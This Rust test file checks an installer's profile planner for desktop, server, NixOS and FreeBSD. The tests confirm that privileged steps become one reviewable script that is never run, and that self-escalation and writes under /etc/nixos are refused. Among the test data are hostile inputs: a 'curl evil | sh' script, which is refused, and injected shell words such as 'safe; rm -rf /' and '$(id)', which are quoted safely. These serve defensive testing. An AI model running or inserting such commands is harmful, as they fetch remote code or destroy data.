//! Named install profiles across the existing installer APIs.
//!
//! RED first: these tests describe the profile plan executor that
//! `crates/veles-install/src/profiles.rs` must provide. Nothing here
//! touches the host: every path is under a temporary directory, and the
//! privileged half is only ever ASSERTED as text.
// Linux/FreeBSD host plans (system units, accounts, /etc paths); the
// Windows desktop profile is exercised by veles-frontends' API tests.
#![cfg(unix)]

use std::path::{Path, PathBuf};
use veles_install::profiles::{
    EmittedFile, HostLayout, NamedProfile, ProfileInput, ProfilePlan, Runner, Step, StepResult,
    SystemStep, Target,
};
use veles_install::{Action, ComponentKind, ComponentSpec, InstallService, Paths, Plan};

fn setup() -> veles_core::setup::SetupPlan {
    veles_core::setup::setup_plan(&veles_core::setup::SetupAnswers::default(), None).unwrap()
}

fn host(root: &Path, target: Target) -> HostLayout {
    HostLayout {
        target,
        bin: root.join("bin/veles"),
        user: Some("veles".into()),
        group: None,
        config_dir: root.join("config"),
        data_dir: root.join("data"),
        system_service: false,
        write_root: root.to_path_buf(),
        user_unit_dir: root.join("config/systemd/user"),
        system_unit_dir: root.join("etc/systemd/system"),
        rc_dir: root.join("usr/local/etc/rc.d"),
        rc_source: Some(root.join("units/veles.rc")),
    }
}

fn component(root: &Path) -> ComponentSpec {
    // The plan signs the reviewed artifact, so it has to exist.
    let artifact = root.join("plugin");
    std::fs::write(&artifact, "#!/bin/sh\nexit 0\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&artifact, std::fs::Permissions::from_mode(0o700)).unwrap();
    }
    ComponentSpec {
        name: "fixture".into(),
        kind: ComponentKind::ProcessPlugin,
        manifest: veles_types::plugin::Manifest {
            name: "fixture".into(),
            version: "1".into(),
            protocol: veles_types::plugin::PROTOCOL,
            ..Default::default()
        },
        source: Some(artifact),
        describe_error: None,
    }
}

fn plan_for(profile: NamedProfile, root: &Path, target: Target) -> ProfilePlan {
    let setup = setup();
    let components = vec![component(root)];
    let host = host(root, target);
    veles_install::profiles::plan(&ProfileInput {
        profile,
        host: &host,
        setup: &setup,
        components: &components,
        plan: None,
    })
    .expect("the profile plan is buildable")
}

/// The literal commands a script would EXECUTE: comments dropped.
fn executed_lines(script: &str) -> Vec<String> {
    script
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .map(str::to_string)
        .collect()
}

// ── desktop ─────────────────────────────────────────────────────────

#[test]
fn desktop_plans_setup_and_the_selected_components_with_no_privilege_at_all() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();
    let setup = setup();
    let components = vec![component(root)];
    let host = host(root, Target::Linux);
    let plan = veles_install::profiles::plan(&ProfileInput {
        profile: NamedProfile::Desktop,
        host: &host,
        setup: &setup,
        components: &components,
        plan: None,
    })
    .unwrap();

    assert_eq!(plan.profile, NamedProfile::Desktop);
    assert!(plan.complete);
    assert!(
        plan.system.is_empty(),
        "a desktop install needs no root action: {:?}",
        plan.system
    );
    assert_eq!(
        plan.script().unwrap(),
        None,
        "no privileged work means no script"
    );
    let config = plan
        .user
        .iter()
        .find_map(|step| match step {
            Step::Config { path, sha256, .. } => Some((path.clone(), sha256.clone())),
            _ => None,
        })
        .expect("the setup plan is a typed config step");
    assert_eq!(config.0, host.config_dir.join("config.toml"));
    assert_eq!(
        config.1,
        veles_install::sha256(setup.config_toml.as_bytes())
    );
    assert!(
        plan.user
            .iter()
            .any(|s| matches!(s, Step::Component { name, .. } if name == "fixture")),
        "the selected component is planned: {:?}",
        plan.user
    );
    let review = plan.review();
    assert_eq!(review["profile"], "desktop");
    assert_eq!(review["complete"], true);
    assert!(review["privileged_script"].is_null());
}

#[test]
fn a_component_that_could_not_be_described_is_refused_not_planned() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();
    let setup = setup();
    let mut broken = component(root);
    broken.describe_error = Some("--describe failed".into());
    let err = veles_install::profiles::plan(&ProfileInput {
        profile: NamedProfile::Desktop,
        host: &host(root, Target::Linux),
        setup: &setup,
        components: &[broken],
        plan: None,
    })
    .unwrap_err();
    assert!(format!("{err:#}").contains("describe"), "{err:#}");
}

// ── server ──────────────────────────────────────────────────────────

#[test]
fn server_plans_a_user_gateway_unit_and_one_explicit_linger_action() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();
    let plan = plan_for(NamedProfile::Server, root, Target::Linux);

    assert!(plan.complete);
    let unit = plan
        .user
        .iter()
        .find_map(|step| match step {
            Step::UserFile { path, contents, .. } => Some((path.clone(), contents.clone())),
            _ => None,
        })
        .expect("the gateway user unit is a typed file step");
    assert_eq!(unit.0, host(root, Target::Linux).local_user_unit());
    let body = String::from_utf8(unit.1).unwrap();
    assert!(
        body.contains(&format!(
            "ExecStart={} gateway run",
            root.join("bin/veles").display()
        )),
        "{body}"
    );
    assert!(body.contains("WantedBy=default.target"), "{body}");

    assert_eq!(
        plan.system.len(),
        1,
        "at boot means exactly one root action: {:?}",
        plan.system
    );
    assert!(matches!(&plan.system[0], SystemStep::Command { argv, .. }
        if argv == &["loginctl", "enable-linger", "veles"]));

    let script = plan
        .script()
        .unwrap()
        .expect("a privileged action means exactly one script");
    assert!(script.text.starts_with("#!/bin/sh"), "{}", script.text);
    assert!(
        script.text.contains("\nset -eu\n"),
        "fail-fast:\n{}",
        script.text
    );
    assert_eq!(script.steps.len(), 1);
    let executed = executed_lines(&script.text);
    // Exactly the header and one command: no `|| true`, no swallowed
    // exit, nothing the script does beyond the reviewed action.
    assert_eq!(
        executed,
        vec![
            "set -eu".to_string(),
            "loginctl enable-linger veles".to_string()
        ],
        "{}",
        script.text
    );
    for line in &executed {
        assert!(
            !line.starts_with("sudo") && !line.starts_with("doas") && !line.starts_with("pkexec"),
            "the script IS the privileged thing; it never escalates itself: {line}"
        );
        assert!(
            !line.contains("systemctl --user enable") && !line.contains("enable --now"),
            "nothing is enabled automatically: {line}"
        );
        assert!(
            !line.contains("|| true") && !line.contains("2>/dev/null"),
            "no ignored error: {line}"
        );
    }
    assert!(
        plan.notes
            .iter()
            .any(|n| n.contains("systemctl --user enable --now veles-gateway")),
        "{:?}",
        plan.notes
    );
}

#[test]
fn a_cli_host_request_cannot_discard_serialized_component_artifacts() {
    let temp = tempfile::tempdir().unwrap();
    let mut answers = veles_install::ProfileAnswers {
        profile: NamedProfile::ContainerHost,
        ..Default::default()
    };
    answers.components.push("veles-plugin-fixture".into());
    let error = veles_install::ProfileRequest::host(answers)
        .expect_err("a serialized native component must not silently disappear");
    assert!(
        error.to_string().contains("component selections"),
        "{error:#}"
    );
    assert!(!temp.path().join("install.toml").exists());
}

// ── the runner ──────────────────────────────────────────────────────

#[test]
fn the_runner_never_executes_a_system_step_and_hands_back_the_script() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();
    let plan = plan_for(NamedProfile::Server, root, Target::Linux);
    std::fs::create_dir_all(root.join("config")).unwrap();
    std::fs::create_dir_all(root.join("install")).unwrap();
    let runner = Runner::new(root.to_path_buf()).dry_run();
    let report = runner.run(&plan).unwrap();
    assert!(report.dry_run);
    assert!(
        report.script.is_some(),
        "the privileged half is returned for review, never run"
    );
    for (step, outcome) in plan.user.iter().zip(&report.steps) {
        assert!(
            matches!(outcome.result, StepResult::WouldDo | StepResult::Skipped(_)),
            "{}: {:?}",
            step.describe(),
            outcome.result
        );
    }
    assert!(
        !host(root, Target::Linux)
            .config_dir
            .join("systemd/user/veles-gateway.service")
            .exists(),
        "a dry run writes nothing"
    );
}

#[test]
fn a_plan_that_is_not_implemented_is_refused_by_the_runner_and_writes_nothing() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();
    let mut plan = plan_for(NamedProfile::Desktop, root, Target::Linux);
    plan.complete = false;
    plan.unsupported = vec!["explicit test gap".into()];
    let err = Runner::new(root.to_path_buf()).run(&plan).unwrap_err();
    let text = format!("{err:#}");
    assert!(text.contains("not implemented"), "{text}");
    assert!(
        !root
            .join("config/systemd/user/veles-gateway.service")
            .exists(),
        "a refused plan writes nothing"
    );
}

#[test]
fn the_runner_is_ordered_and_fails_fast_inside_the_temp_root() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();
    let outside = temp.path().join("outside.txt");
    std::fs::write(&outside, "untouched\n").unwrap();

    let file = |name: &str, body: &str| Step::UserFile {
        path: root.join(name),
        contents: body.as_bytes().to_vec(),
        mode: Some(0o600),
        expected_sha256: None,
    };
    let plan = ProfilePlan {
        profile: NamedProfile::Desktop,
        target: Target::Linux,
        user: vec![
            file("one.txt", "one\n"),
            file("nested/two.txt", "two\n"),
            file("three.txt", "three\n"),
        ],
        system: vec![],
        files: vec![],
        unsupported: vec![],
        notes: vec![],
        complete: true,
    };
    plan.validate().unwrap();

    let dry = Runner::new(root.to_path_buf())
        .dry_run()
        .run(&plan)
        .unwrap();
    assert!(dry
        .steps
        .iter()
        .all(|s| matches!(s.result, StepResult::WouldDo)));
    assert!(!root.join("one.txt").exists());
    assert!(!root.join("nested/two.txt").exists());

    let report = Runner::new(root.to_path_buf()).run(&plan).unwrap();
    assert_eq!(report.steps.len(), 3);
    assert_eq!(report.steps[0].index, 1);
    assert_eq!(report.steps[2].index, 3);
    assert_eq!(
        std::fs::read_to_string(root.join("one.txt")).unwrap(),
        "one\n"
    );
    assert_eq!(
        std::fs::read_to_string(root.join("nested/two.txt")).unwrap(),
        "two\n"
    );
    assert_eq!(
        std::fs::read_to_string(&outside).unwrap(),
        "untouched\n",
        "nothing outside the plan root is touched"
    );
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = std::fs::metadata(root.join("one.txt"))
            .unwrap()
            .permissions()
            .mode()
            & 0o777;
        assert_eq!(mode, 0o600);
    }
}

#[test]
fn the_runner_stops_at_the_first_failure_and_reports_which_step_it_was() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();
    std::fs::write(root.join("two.txt"), "someone else's\n").unwrap();
    let file = |name: &str, body: &str| Step::UserFile {
        path: root.join(name),
        contents: body.as_bytes().to_vec(),
        mode: None,
        expected_sha256: None,
    };
    let plan = ProfilePlan {
        profile: NamedProfile::Desktop,
        target: Target::Linux,
        user: vec![
            file("one.txt", "one\n"),
            file("two.txt", "two\n"),
            file("three.txt", "three\n"),
        ],
        system: vec![],
        files: vec![],
        unsupported: vec![],
        notes: vec![],
        complete: true,
    };
    let err = Runner::new(root.to_path_buf()).run(&plan).unwrap_err();
    let text = format!("{err:#}");
    assert!(text.contains("two.txt"), "{text}");
    assert!(
        root.join("one.txt").exists(),
        "the steps before the failure did run"
    );
    assert!(!root.join("three.txt").exists(), "and nothing after it did");
    assert_eq!(
        std::fs::read_to_string(root.join("two.txt")).unwrap(),
        "someone else's\n",
        "the conflicting file is left exactly as it was"
    );
}

#[test]
fn a_user_file_outside_the_runner_root_is_refused_before_it_is_written() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path().join("root");
    std::fs::create_dir_all(&root).unwrap();
    let plan = ProfilePlan {
        profile: NamedProfile::Desktop,
        target: Target::Linux,
        user: vec![Step::UserFile {
            path: PathBuf::from("/etc/veles/escaped.toml"),
            contents: b"no\n".to_vec(),
            mode: None,
            expected_sha256: None,
        }],
        system: vec![],
        files: vec![],
        unsupported: vec![],
        notes: vec![],
        complete: true,
    };
    let err = Runner::new(root.clone()).dry_run().run(&plan).unwrap_err();
    assert!(format!("{err:#}").contains("outside"), "{err:#}");
    assert!(!Path::new("/etc/veles/escaped.toml").exists());
}

// ── the existing install APIs, not a second implementation ──────────

fn fixture(root: &Path) -> PathBuf {
    std::fs::create_dir_all(root).unwrap();
    let exe = root.join("veles-plugin-fixture");
    std::fs::write(
        &exe,
        "#!/bin/sh\nif [ \"$1\" = --describe ]; then\nprintf '%s\\n' '{\"name\":\"fixture\",\"version\":\"1\",\"protocol\":1,\"description\":\"fixture\",\"config_sections\":[\"platforms.fixture\"],\"knobs\":[]}'\nexit 0\nfi\nexit 0\n",
    )
    .unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&exe, std::fs::Permissions::from_mode(0o700)).unwrap();
    }
    std::fs::write(
        root.join("plugin.toml"),
        "name = \"fixture\"\nkind = \"process\"\nentry = \"veles-plugin-fixture\"\n",
    )
    .unwrap();
    exe
}

#[test]
fn a_component_step_goes_through_the_reviewed_installer_not_a_second_one() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();
    let config_dir = root.join("config");
    let data_dir = root.join("data");
    std::fs::create_dir_all(&config_dir).unwrap();
    std::fs::create_dir_all(&data_dir).unwrap();
    fixture(&data_dir.join("process-plugins/fixture"));
    let service = InstallService::new(Paths::for_roots(config_dir.clone(), data_dir.clone()));
    let spec = service.component("fixture").unwrap();
    let setup = setup();
    let host = host(root, Target::Linux);
    let plan = veles_install::profiles::plan(&ProfileInput {
        profile: NamedProfile::Desktop,
        host: &host,
        setup: &setup,
        components: &[spec],
        plan: None,
    })
    .unwrap();
    let report = Runner::new(root.to_path_buf())
        .service(service.clone())
        .run(&plan)
        .unwrap();
    assert!(
        report
            .steps
            .iter()
            .any(|s| matches!(s.result, StepResult::Done)),
        "{:?}",
        report.steps
    );
    let record = service.record().unwrap();
    assert!(
        record.components.iter().any(|c| c.name == "fixture"),
        "the component landed through install.toml: {record:?}"
    );
}

#[test]
fn a_changed_component_after_the_plan_is_refused_by_the_runner() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();
    let config_dir = root.join("config");
    let data_dir = root.join("data");
    std::fs::create_dir_all(&config_dir).unwrap();
    std::fs::create_dir_all(&data_dir).unwrap();
    let dir = data_dir.join("process-plugins/fixture");
    fixture(&dir);
    let service = InstallService::new(Paths::for_roots(config_dir, data_dir));
    let setup = setup();
    let host = host(root, Target::Linux);
    let plan = veles_install::profiles::plan(&ProfileInput {
        profile: NamedProfile::Desktop,
        host: &host,
        setup: &setup,
        components: &[service.component("fixture").unwrap()],
        plan: None,
    })
    .unwrap();
    // The reviewed executable changed behind the plan's back. Discovery
    // metadata alone is not the artifact identity this plan signs.
    std::fs::write(dir.join("veles-plugin-fixture"), "#!/bin/sh\nexit 99\n").unwrap();
    let err = Runner::new(root.to_path_buf())
        .service(service.clone())
        .run(&plan)
        .unwrap_err();
    assert!(format!("{err:#}").contains("fixture"), "{err:#}");
    assert!(
        !service.record_path().exists(),
        "a refused component step records nothing"
    );
}

// ── privileged actions from the foundation plan ─────────────────────

#[test]
fn a_privileged_foundation_action_is_folded_into_the_one_script_not_run() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();
    let setup = setup();
    let host = host(root, Target::Linux);
    let foundation = Plan {
        profile: veles_install::Profile::Server,
        actions: vec![
            Action::WriteFile {
                path: PathBuf::from("etc/example.conf"),
                contents: b"kept\n".to_vec(),
                mode: Some(0o644),
                expected_sha256: None,
            },
            Action::Command {
                argv: vec!["loginctl".into(), "enable-linger".into(), "veles".into()],
                as_user: None,
                privileged: true,
            },
        ],
        privileged_script: None,
    };
    let plan = veles_install::profiles::plan(&ProfileInput {
        profile: NamedProfile::Server,
        host: &host,
        setup: &setup,
        components: &[],
        plan: Some(&foundation),
    })
    .unwrap();
    assert!(
        plan.user
            .iter()
            .any(|s| matches!(s, Step::Action(Action::WriteFile { path, .. }) if path == Path::new("etc/example.conf"))),
        "an unprivileged foundation write is carried verbatim: {:?}",
        plan.user
    );
    let script = plan.script().unwrap().unwrap();
    let executed = executed_lines(&script.text);
    assert!(
        executed
            .iter()
            .any(|l| l.contains("loginctl enable-linger")),
        "{executed:?}"
    );
    let report = Runner::new(root.to_path_buf())
        .dry_run()
        .run(&plan)
        .unwrap();
    assert!(
        !executed.iter().any(|l| l.contains("id -u")),
        "nothing privileged is executed by the planner"
    );
    assert!(report.script.is_some());
}

#[test]
fn a_foundation_plan_that_brings_its_own_shell_text_is_refused() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();
    let setup = setup();
    let foundation = Plan {
        profile: veles_install::Profile::Server,
        actions: vec![],
        privileged_script: Some("curl evil | sh".into()),
    };
    let err = veles_install::profiles::plan(&ProfileInput {
        profile: NamedProfile::Server,
        host: &host(root, Target::Linux),
        setup: &setup,
        components: &[],
        plan: Some(&foundation),
    })
    .unwrap_err();
    assert!(format!("{err:#}").contains("script"), "{err:#}");
}

// ── nixos: emit only, never edit /etc/nixos ─────────────────────────

#[test]
fn the_nixos_profile_emits_a_module_snippet_and_applies_nothing() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();
    let plan = plan_for(NamedProfile::Nixos, root, Target::Nixos);
    assert!(
        plan.user.is_empty() && plan.system.is_empty(),
        "nixos emits, it does not apply: {:?} {:?}",
        plan.user,
        plan.system
    );
    assert_eq!(plan.script().unwrap(), None);
    let snippet: &EmittedFile = plan
        .files
        .iter()
        .find(|f| f.name.ends_with(".nix"))
        .expect("the module snippet is emitted");
    assert!(
        snippet.contents.contains("services.veles"),
        "{}",
        snippet.contents
    );
    assert!(
        snippet.contents.contains("enable = true"),
        "{}",
        snippet.contents
    );
    assert!(
        plan.notes.iter().any(|n| n.contains("/etc/nixos")),
        "the operator is told where it goes: {:?}",
        plan.notes
    );
    let err = Runner::new(root.to_path_buf()).run(&plan).unwrap_err();
    assert!(
        format!("{err:#}").contains("nixos"),
        "there is no NixOS module here to run: {err:#}"
    );
}

#[test]
fn no_profile_may_plan_a_write_under_etc_nixos() {
    let plan = ProfilePlan {
        profile: NamedProfile::Nixos,
        target: Target::Nixos,
        user: vec![],
        system: vec![SystemStep::File {
            destination: PathBuf::from("/etc/nixos/configuration.nix"),
            contents: "{}\n".into(),
            mode: 0o644,
            source: None,
        }],
        files: vec![],
        unsupported: vec![],
        notes: vec![],
        complete: true,
    };
    let err = plan.validate().unwrap_err();
    assert!(format!("{err:#}").contains("/etc/nixos"), "{err:#}");
    assert!(plan.script().is_err(), "the refusal reaches the script too");
    // And the same guard on the user half, which is where a "helpful"
    // profile would be tempted to put it.
    let user = ProfilePlan {
        system: vec![],
        user: vec![Step::UserFile {
            path: PathBuf::from("/etc/nixos/veles.nix"),
            contents: b"{}\n".to_vec(),
            mode: None,
            expected_sha256: None,
        }],
        ..plan
    };
    assert!(user.validate().is_err());
}

#[test]
fn asking_for_a_native_profile_on_a_nixos_host_is_refused() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();
    let setup = setup();
    let err = veles_install::profiles::plan(&ProfileInput {
        profile: NamedProfile::Server,
        host: &host(root, Target::Nixos),
        setup: &setup,
        components: &[],
        plan: None,
    })
    .unwrap_err();
    let text = format!("{err:#}");
    assert!(text.contains("nixos"), "{text}");
    assert!(text.contains("services.veles"), "{text}");
}

// ── container-host: generic coverage, no pretending ─────────────────

#[test]
fn container_host_does_not_infer_native_gateway_installation() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();
    let plan = plan_for(NamedProfile::ContainerHost, root, Target::Linux);
    assert!(plan.complete);
    assert!(
        plan.user.is_empty(),
        "no native config or component installation is inferred: {:?}",
        plan.user
    );
    assert!(
        plan.system.is_empty(),
        "the typed service attaches its reviewed host script"
    );
    assert!(plan
        .notes
        .iter()
        .any(|n| n.contains("PDS") && n.contains("separate")));
    let review = plan.review();
    assert_eq!(review["complete"], true);
    assert!(review["unsupported"].as_array().unwrap().is_empty());
}

// ── freebsd: the rc.d source path, not a generated body ─────────────

#[test]
fn the_freebsd_server_plan_installs_the_reviewed_rcd_source() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();
    let host = host(root, Target::FreeBsd);
    let rc_source = host.rc_source.clone().unwrap();
    std::fs::create_dir_all(rc_source.parent().unwrap()).unwrap();
    std::fs::write(&rc_source, "#!/bin/sh\n# reviewed fixture rc script\n").unwrap();
    let plan = plan_for(NamedProfile::Server, root, Target::FreeBsd);
    assert!(
        plan.user
            .iter()
            .all(|s| !matches!(s, Step::UserFile { path, .. } if path.to_string_lossy().contains("systemd"))),
        "freebsd has no systemd unit: {:?}",
        plan.user
    );
    let file = plan
        .system
        .iter()
        .find_map(|s| match s {
            SystemStep::File {
                destination,
                mode,
                source,
                ..
            } => Some((destination.clone(), *mode, source.clone())),
            _ => None,
        })
        .expect("the rc.d script is the privileged action");
    assert_eq!(file.0, host.rc_dir.join("veles"));
    assert_eq!(file.1, 0o555);
    assert_eq!(
        file.2, host.rc_source,
        "the reviewed source path is carried, never regenerated"
    );
    let script = plan.script().unwrap().unwrap();
    let executed = executed_lines(&script.text);
    assert!(
        executed
            .iter()
            .any(|l| l.contains("install -m 0555") && l.contains(&rc_source.display().to_string())),
        "{executed:?}"
    );
    assert!(
        executed.iter().any(|l| l.contains("[ -f ")),
        "a missing source fails the script, it does not fall back: {executed:?}"
    );
    assert!(plan
        .notes
        .iter()
        .any(|n| n.contains("sysrc veles_enable=YES")));
}

// ── the script is one document, and it is validated ─────────────────

#[test]
fn every_system_action_lands_in_one_script_and_a_self_escalation_is_refused() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();
    let mut plan = plan_for(NamedProfile::Server, root, Target::Linux);
    plan.system.push(SystemStep::File {
        destination: root.join("etc/systemd/system/veles-gateway.service"),
        contents: "[Unit]\nDescription=x\n".into(),
        mode: 0o644,
        source: None,
    });
    let script = plan.script().unwrap().unwrap();
    assert_eq!(script.steps.len(), plan.system.len());
    let executed = executed_lines(&script.text);
    assert!(
        executed.iter().any(|l| l.contains("cat > ")),
        "a file arrives through a temp file, not a heredoc onto the target: {executed:?}"
    );
    assert!(
        executed
            .iter()
            .any(|l| l.trim_start().starts_with("mv -f ")),
        "{executed:?}"
    );
    assert_eq!(script.sha256, veles_install::sha256(script.text.as_bytes()));

    // Each rule is isolated, or one guard silently covers for another:
    // a `sudo systemctl enable` fails on BOTH counts and would leave
    // the self-escalation check untested.
    let mut escalated = plan.clone();
    escalated.system.push(SystemStep::Command {
        argv: vec!["sudo".into(), "loginctl".into(), "enable-linger".into()],
        reason: "no".into(),
    });
    let error = escalated.validate().unwrap_err().to_string();
    assert!(
        error.contains("escalate"),
        "self-escalation is refused on its own, not as a side effect: {error}"
    );
    let mut enabling = plan;
    enabling.system.push(SystemStep::Command {
        argv: vec![
            "systemctl".into(),
            "--user".into(),
            "enable".into(),
            "--now".into(),
        ],
        reason: "no".into(),
    });
    let error = enabling.validate().unwrap_err().to_string();
    assert!(
        error.contains("operator's line"),
        "service enable is the operator's line to type: {error}"
    );
}

// ── the carried payload is the reviewed one ─────────────────────────

#[test]
fn a_config_step_whose_digest_does_not_match_its_setup_plan_is_refused() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();
    std::fs::create_dir_all(root.join("config")).unwrap();
    let setup = setup();
    let plan = ProfilePlan {
        profile: NamedProfile::Desktop,
        target: Target::Linux,
        user: vec![Step::Config {
            path: root.join("config/config.toml"),
            // A digest that is well-formed but not this plan's: the
            // shape passes `validate`, so only the runner's own check
            // can catch a payload swapped after review.
            sha256: veles_install::sha256(b"a different config entirely"),
            mode: Some(0o600),
            setup,
        }],
        system: vec![],
        files: vec![],
        unsupported: vec![],
        notes: vec![],
        complete: true,
    };
    plan.validate()
        .expect("a bad-but-valid digest is a runner check");
    let err = Runner::new(root.to_path_buf()).run(&plan).unwrap_err();
    assert!(
        format!("{err:#}").contains("digest does not match"),
        "{err:#}"
    );
    assert!(
        !root.join("config/config.toml").exists(),
        "a refused config step writes nothing"
    );
}

#[test]
fn a_shell_metacharacter_in_a_word_can_never_become_syntax() {
    // The unit tests for this live in the library target; this is the
    // end-to-end half: a hostile argv reaches the rendered script only
    // as data, and a newline is refused outright.
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();
    let mut plan = plan_for(NamedProfile::Server, root, Target::Linux);
    plan.system.push(SystemStep::Command {
        argv: vec![
            "logger".into(),
            "safe; rm -rf /".into(),
            "$(id)".into(),
            "back`tick`".into(),
        ],
        reason: "a word from untrusted input".into(),
    });
    let script = plan.script().unwrap().unwrap();
    let rendered = executed_lines(&script.text)
        .into_iter()
        .find(|l| l.starts_with("logger"))
        .expect("the command is in the script");
    assert_eq!(
        rendered, r"logger 'safe; rm -rf /' '$(id)' 'back`tick`'",
        "{}",
        script.text
    );
    // Quoted, so sh itself sees four words and runs `printf`. Proving it
    // with a real interpreter, not a splitter of my own: if the quoting
    // were wrong, `rm -rf /` would execute or the word count would move.
    let probe = root.join("probe.sh");
    std::fs::write(
        &probe,
        format!(
            "#!/bin/sh\nset -eu\ncount() {{ printf '%s\\n' \"$#\"; }}\ncount {} {}\n",
            // Re-render only the two words under test, so the probe does
            // not try to run `logger` (which may not exist).
            render_for_sh("x; y"),
            render_for_sh("$(id)")
        ),
    )
    .unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&probe, std::fs::Permissions::from_mode(0o700)).unwrap();
    }
    let out = std::process::Command::new("/bin/sh").arg(&probe).output();
    match out {
        Ok(out) if out.status.success() => {
            assert_eq!(
                String::from_utf8_lossy(&out.stdout).trim(),
                "2",
                "sh saw the metacharacters as data, not syntax"
            );
        }
        Ok(out) => panic!("{}", String::from_utf8_lossy(&out.stderr)),
        // No /bin/sh (a Windows test host): the rendered text above is
        // already the assertion that matters.
        Err(_) => {}
    }
    plan.system.push(SystemStep::Command {
        argv: vec!["logger".into(), "two\nlines".into()],
        reason: "no".into(),
    });
    assert!(
        plan.script().is_err(),
        "a newline cannot be smuggled into the reviewed script"
    );
}

/// The planner's own quoting, reached through the public script: build a
/// one-step plan and take the rendered command line back out of it.
fn render_for_sh(word: &str) -> String {
    let plan = ProfilePlan {
        profile: NamedProfile::Server,
        target: Target::Linux,
        user: vec![],
        system: vec![SystemStep::Command {
            argv: vec!["probe".into(), word.into()],
            reason: "quoting".into(),
        }],
        files: vec![],
        unsupported: vec![],
        notes: vec![],
        complete: true,
    };
    let script = plan.script().unwrap().unwrap();
    executed_lines(&script.text)
        .into_iter()
        .find(|l| l.starts_with("probe "))
        .expect("the command is in the script")
        .trim_start_matches("probe ")
        .to_string()
}

#[test]
fn the_nixos_profile_may_never_carry_a_step() {
    // `plan()` never produces one, so this guards the INVARIANT against a
    // future frontend that assembles a ProfilePlan itself: reaching
    // /etc/nixos through a step is the one thing this profile must not do.
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();
    let mut plan = plan_for(NamedProfile::Nixos, root, Target::Nixos);
    plan.files.clear();
    plan.user.push(Step::UserFile {
        path: root.join("harmless.nix"),
        contents: b"{}\n".to_vec(),
        mode: None,
        expected_sha256: None,
    });
    let error = plan.validate().unwrap_err().to_string();
    assert!(
        error.contains("applies nothing"),
        "an emitting profile that also applies is refused: {error}"
    );
}

#[test]
fn a_stale_setup_plan_is_refused_by_the_runner_with_the_file_untouched() {
    // The digest check in the runner is a SECOND boundary. The first is
    // `apply_with`'s own base signature, which is what actually fires
    // here: an existing config the plan was not computed from is a stale
    // plan, and `veles_core::setup` refuses it before any write. That is
    // the behaviour worth pinning — a runner that reported success over
    // an untouched or unexpectedly merged file would be the defect.
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();
    let config_dir = root.join("config");
    std::fs::create_dir_all(&config_dir).unwrap();
    let existing = "# operator's line\n[model]\ndefault = \"their-choice\"\n";
    std::fs::write(config_dir.join("config.toml"), existing).unwrap();
    let setup = setup();
    let plan = ProfilePlan {
        profile: NamedProfile::Desktop,
        target: Target::Linux,
        user: vec![Step::Config {
            path: config_dir.join("config.toml"),
            sha256: veles_install::sha256(setup.config_toml.as_bytes()),
            mode: Some(0o600),
            setup,
        }],
        system: vec![],
        files: vec![],
        unsupported: vec![],
        notes: vec![],
        complete: true,
    };
    plan.validate().unwrap();
    let error = Runner::new(root.to_path_buf()).run(&plan).unwrap_err();
    let text = format!("{error:#}");
    assert!(
        text.contains("changed since the preview"),
        "the stale-base refusal is surfaced, named to the step: {text}"
    );
    assert_eq!(
        std::fs::read_to_string(config_dir.join("config.toml")).unwrap(),
        existing,
        "a refused config step leaves the operator's file exactly as it was"
    );
    assert!(
        !config_dir.join("config.toml.bak").exists(),
        "and writes no backup of a change it never made"
    );
}

#[test]
fn the_emitting_profile_refuses_a_supplied_action_plan() {
    // The early return used to drop it on the floor: a caller that passed
    // a plan believed its actions were applied, and the profile reported
    // success having applied nothing. "Nothing was applied" must mean
    // nothing was asked for either.
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();
    let setup = setup();
    let foundation = Plan {
        profile: veles_install::Profile::Nixos,
        actions: vec![Action::WriteFile {
            path: PathBuf::from("etc/should-not-be-dropped.conf"),
            contents: b"x\n".to_vec(),
            mode: None,
            expected_sha256: None,
        }],
        privileged_script: None,
    };
    let err = veles_install::profiles::plan(&ProfileInput {
        profile: NamedProfile::Nixos,
        host: &host(root, Target::Nixos),
        setup: &setup,
        components: &[],
        plan: Some(&foundation),
    })
    .unwrap_err();
    assert!(format!("{err:#}").contains("applies nothing"), "{err:#}");
}
